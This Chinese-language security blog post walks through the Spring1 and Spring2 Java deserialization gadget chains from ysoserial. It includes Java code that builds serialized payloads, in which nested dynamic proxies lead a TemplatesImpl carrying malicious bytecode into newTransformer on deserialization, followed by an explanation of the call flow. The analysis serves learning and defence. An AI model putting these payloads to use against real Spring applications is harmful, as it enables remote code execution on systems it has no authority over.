<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Spring2"><meta name="keywords" content="JAVA"><meta name="author" content="Ch4n"><meta name="copyright" content="Ch4n"><title>Spring2 | Ch4n's field</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring1"><span class="toc-number">1.</span> <span class="toc-text">Spring1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring2"><span class="toc-number">2.</span> <span class="toc-text">Spring2</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://s2.loli.net/2022/04/14/fvYg1n5VQ3W7c26.jpg"></div><div class="author-info__name text-center">Ch4n</div><div class="author-info__description text-center">web菜狗 BTW,师傅我想当大黑阔</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">5</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">2</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://darkeyer.github.io">MR.R</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://lotke0.github.io/">lotke</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://d6s3.ac.cn/">d6s3</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.loli.net/2022/04/14/JheaSImNiDZVRPn.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Ch4n's field</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Spring2</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-10-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JAVA反序列化</a><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2022/10/14/Spring1/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2022/10/14/Spring1/"></span></a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>关于Spring链子动态代理的一些粗浅理解</p>
<span id="more"></span>

<h1 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">    TemplatesImpl tmpl = Util.getTemplatesImpl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理</span></span><br><span class="line">    <span class="comment">//memberValues.get(member)其实就是map.get()通过key获得值</span></span><br><span class="line">    <span class="comment">//因为预期我们调用的方法是getObject,所以我们设置key为getObject</span></span><br><span class="line">    <span class="comment">//返回我们的TemplatesImpl实例</span></span><br><span class="line">    Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;getObject&quot;</span>, tmpl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span></span><br><span class="line">    ObjectFactory&lt;?&gt; factoryProxy = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(</span><br><span class="line">        ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> Class[]&#123;ObjectFactory.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/////////到此为止,调用getObject()会返回TemplatesImpl////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span></span><br><span class="line">    <span class="comment">// 并且会调用 method.invoke(返回值,args)</span></span><br><span class="line">    <span class="comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span></span><br><span class="line">    <span class="comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span></span><br><span class="line">    Class&lt;?&gt;       autowireUtilsObjectFactoryDelegatingInvocationHandler         = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; ofdConstructor = autowireUtilsObjectFactoryDelegatingInvocationHandler.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ofdConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line">    InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factoryProxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span></span><br><span class="line">    <span class="comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span></span><br><span class="line">    <span class="comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span></span><br><span class="line">    <span class="comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span></span><br><span class="line">    Type typeofdHandlerProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br><span class="line">    <span class="comment">/////////次外层代理,调用typeofdHandlerProxy的任意方法会调用factory代理对象的getObject方法////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeofdHandlerProxy 代理类</span></span><br><span class="line">    HashMap&lt;String, Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map2.put(<span class="string">&quot;getType&quot;</span>, typeofdHandlerProxy);</span><br><span class="line"></span><br><span class="line">    InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span></span><br><span class="line">    Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;typeProviderClass&#125;, newInvocationHandler);</span><br><span class="line">    <span class="comment">////////到此为止是最外层的动态代理,TypeProvider.getType返回typeofdHandlerProxy////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    Class&lt;?&gt;       methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">    Constructor&lt;?&gt; cons   = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">    <span class="comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span></span><br><span class="line">    <span class="comment">//经过测试,初始化methodInvokeTypeProvider对象时不能提供newTransformer方法,否则不会触发</span></span><br><span class="line">    Object methodInvokeTypeProvider = cons.newInstance(typeProviderProxy, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">    Field field   = methodInvokeTypeProviderClass.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Util.serialize(methodInvokeTypeProvider);</span><br><span class="line">    Util.unserialize();</span><br></pre></td></tr></table></figure>

<p>我们对这段代码进行分析</p>
<p>一共进行了三次动态代理</p>
<p>最外层的代理对象是<code>typeProviderProxy</code>,handler是<code>AnnotationInvocationHandler</code>,作用是触发代理getType()方法返回内部<code>typeofdHandlerProxy</code>代理对象</p>
<p>次外层代理对象是<code>typeofdHandlerProxy</code>,handler是<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>作用是调用<code>typeofdHandlerProxy</code></p>
<p>对象的任意方法会调用<code>handler.ObjectFactory.getObject()</code></p>
<p>第三层代理是<code>factoryProxy</code>代理对象,也就是上面的<code>handler.ObjectFactory</code>属性,handler是<code>AnnotationInvocationHandler</code>作用是触发代理对象的getObject()方法返回恶意<code>TemplatesImpl</code>对象</p>
<p>下面来看流程</p>
<p>在 readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider 的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.result = ReflectionUtils.*invokeMethod*(method, this.provider.getType());</span><br></pre></td></tr></table></figure>

<p>中,<code>this.provider</code> 就是我们的第一个代理对象<code>typeProviderProxy</code>,调用<code>getType</code> 方法返回</p>
<p><code>typeofdHandlerProxy</code>代理对象,这里是触发的是第一层代理</p>
<p>然后</p>
<p><code>this.result = ReflectionUtils.*invokeMethod*(method, typeProviderProxy);</code> 进行方法调用</p>
<p>调用<code>typeProviderProxy</code>对象的newTransformer方法,因为是<code>typeProviderProxy</code> 的handler是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 所以调用`typeProviderProxy` 的结果是调用到了`ObjectFactoryDelegatingInvocationHandler.invoke</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/10/14/UZR8Y7as3hiOpNk.png" alt="image-20221014155403469">)</p>
<p>最终在invoke方法中调用到了<code>this.objectFactory.getObject()</code> ,这里触发的是第二层代理</p>
<p>而我们知道<code>objectFactory</code>其实是factoryProxy代理对象,调用<code>factoryProxy.getObject()</code></p>
<p>会返回TemplatesImpl对象,这里触发的是第三层代理</p>
<p>最后在 invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler</p>
<p><img src="https://s2.loli.net/2022/10/14/4yhxNagCZbjlH8p.png" alt="image-20221014155414729"></p>
<p>这里的Method.name是newTransformer,<code>this.objectFactory.getObject()</code> 的返回结果是TemplatesImpl,也就是调用TemplatesImpl.newTransformer()</p>
<p>整个调用链在这里生效</p>
<h1 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将TemplatesImpl对象封装进AdvisedSupport.targetSource</span></span><br><span class="line">        AdvisedSupport as = <span class="keyword">new</span> AdvisedSupport();</span><br><span class="line">        as.setTargetSource(<span class="keyword">new</span> SingletonTargetSource(templates));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将AdvisedSupport封装进JdkDynamicAopProxy</span></span><br><span class="line">        <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy(</span><br><span class="line">            (InvocationHandler) Reflections.getFirstCtor(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).newInstance(as),</span><br><span class="line">            Type.class,</span><br><span class="line">            Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">            Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">            forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Object mitp = Reflections.createWithoutConstructor(forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>));</span><br><span class="line">        Reflections.setFieldValue(mitp, <span class="string">&quot;provider&quot;</span>, typeProviderProxy);</span><br><span class="line">        Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mitp;</span><br></pre></td></tr></table></figure>

<p>相比于Spring1的代码typeProviderProxy之后都是一样的,我们主要看不同的地方</p>
<p>在 readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider 的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.result = ReflectionUtils.*invokeMethod*(method, this.provider.getType());</span><br></pre></td></tr></table></figure>

<p>中,<code>this.provider</code> 就是我们的第一个代理对象<code>typeProviderProxy</code>,调用<code>getType</code> 方法返回</p>
<p><code>typeJdkDynamicAOPProxy</code>代理对象,这里是触发的是第一层代理</p>
<p><code>this.result = ReflectionUtils.*invokeMethod*(method,typeJdkDynamicAOPProxy);</code> 进行方法调用</p>
<p>调用<code>typeJdkDynamicAOPProxy</code>对象的newTransformer方法,因为是<code>typeJdkDynamicAOPProxy</code> 的handler是<code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 所以调用<code>typeJdkDynamicAOPProxy</code> 的结果是调用到了<code>JdkDynamicAopProxy.invoke</code></p>
<p><img src="https://s2.loli.net/2022/10/14/rAxQhYogz4be52R.png" alt="image-20221014180339329"></p>
<p>我们能看到,最后invoke的对象target来自于this.advised.targetSource</p>
<p>advised属性在初始化时传入,所以我们只需要封装一个advised属性使其中的targetSource属性对应TemplatesImpl,最后就能使target为TemplatesImpl,最后调用到TemplatesImpl.newTransformer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Reference:</span><br><span class="line">https://su18.org/post/ysoserial-su18-3/</span><br><span class="line">https://cangqingzhe.github.io/2022/05/06/Spring1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ch4n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/10/14/Spring1/">http://example.com/2022/10/14/Spring1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Ch4n's field</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA/">JAVA</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2022/04/14/Gadgets/"><span>Gadgets</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'http://example.com/2022/10/14/Spring1/';
  this.page.identifier = '2022/10/14/Spring1/';
  this.page.title = 'Spring2';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'Ch4n' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://Ch4n.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(https://s2.loli.net/2022/04/14/JheaSImNiDZVRPn.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2022 By Ch4n</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">I have promise to keep,and miles to go before I sleep.</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>